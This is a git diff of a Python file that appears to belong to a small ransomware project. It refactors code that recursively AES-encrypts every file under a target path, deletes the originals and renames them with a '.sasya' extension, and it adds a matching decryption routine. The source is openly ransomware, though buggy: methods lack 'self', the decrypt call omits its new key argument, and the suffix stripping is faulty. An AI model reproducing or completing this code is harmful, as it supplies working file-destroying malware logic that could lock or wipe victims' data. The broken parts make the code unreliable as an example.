@@ -1,12 +1,8 @@
 from Crypto.Cipher import AES
 from Crypto.Hash import SHA256 as sha
-import os, glob, zipfile
+import os, glob
 
 KSIZE = 1024
-
-keyPath = 'C:\\Users\\Yeeun\\'
-startPath = 'C:\\Users\\Yeeun\\Desktop\\Ransom_Private\\Ransom\\test\*' # 암 / 복호화할 대상 경로
-print(glob.iglob(startPath, recursive=True))
 
 class myAES():
     def __init__(self, keytext, ivtext):
@@ -57,9 +53,9 @@ class myAES():
         h.close()
         hh.close()
 
-    def dec(self, encfilename) :
+    def dec(self, encfilename, readKey) :
         filename = encfilename.strip('.sasya')
-        aes = AES.new(self.key, AES.MODE_CBC, self.iv)
+        aes = AES.new(readKey, AES.MODE_CBC, self.iv)
 
         h = open(filename, 'wb+')
         hh = open(encfilename, 'rb')
@@ -80,47 +76,26 @@ class myAES():
 
         h.close()
         hh.close()
+    def searchEncFile(path):
+        for filename in glob.glob(path, recursive = True):
+            if 'key' in filename:
+                pass
+            elif os.path.isfile(filename):
+                print('Encrypting> ' + filename) # 파일명 출력
+                aesEnc.makeEncInfo(filename)
+                aesEnc.enc(filename) # Encrypt_file에 위에서 선언한 키값과 파일명을 인자로 호출
+                os.remove(filename) # 현재파일을 제거 (encrypt_file 함수에서 새파일을 작성하였기에 기존파일을 제거해야함.)
+            elif os.path.isdir(filename):
+                searchEncFile(filename)
 
+    def searchDecFile(path):
+        for filename in glob.glob(path, recursive = True):
+            if(os.path.isfile(filename)):
+                fname, ext = os.path.splitext(filename) # 파일명과 확장자를 추출
+                if (ext == '.sasya'): # 확장자가 .enc (암호화된 파일일 때)
+                    print('Decrypting> ' + filename) # 파일명 출력
+                    aesEnc.dec(filename) # 복호화 함수 실행
+                    os.remove(filename)
 
-aesEnc = myAES('keytext', 'ivtext')
-#Encrypts all files recursively starting from startPath
-print(glob.glob(startPath,  recursive=True))
-
-for filename in glob.glob(startPath, recursive=True): # 대상 경로를 재귀적 호출 사용
-    print(filename)
-    if 'key' in filename:
-        pass
-    elif(os.path.isfile(filename)): # 현재 파일이 파일일때
-        print('Encrypting> ' + filename) # 파일명 출력
-        aesEnc.makeEncInfo(filename)
-        aesEnc.enc(filename) # Encrypt_file에 위에서 선언한 키값과 파일명을 인자로 호출
-        os.remove(filename) # 현재파일을 제거 (encrypt_file 함수에서 새파일을 작성하였기에 기존파일을 제거해야함.)
-        '''
-    elif(os.path.isdir(filename)):
-        f = str(dir) + '.zip'
-        print(f)
-        zipf = zipfile.ZipFile(f, 'w')
-        zipf.write(dir, compress_type = zipfile.ZIP_DEFLATED)
-        zipF.close()
-        os.remove(filename)
-        aesEnc.makeEncInfo(f)
-        aesEnc.enc(f)
-        '''
-
-
-#Decrypts the files
-
-for filename in glob.iglob(startPath, recursive=True): # 대상 경로를 재귀적 호출
-    if(os.path.isfile(filename)): # 현재파일이 파일일 때
-        fname, ext = os.path.splitext(filename) # 파일명과 확장자를 추출
-        if (ext == '.sasya'): # 확장자가 .enc (암호화된 파일일 때)
-            print('Decrypting> ' + filename) # 파일명 출력
-            aesEnc.dec(filename) # 복호화 함수 실행
-            '''
-            filename.strip('.sasya')
-            if '.zip' in filename:
-                zipf = zipfile.ZipFile(filename)
-                zipf.extractall(filename)
-                os.remove(filename)
-            '''
-            #os.remove(filename) # 암호화됐던 파일을 제거 (마찬가지로 새파일을 작성하였기에 기존 파일을 제거해야함.)
+            if(os.path.isdir(filename)):
+                searchDecFile(filename)
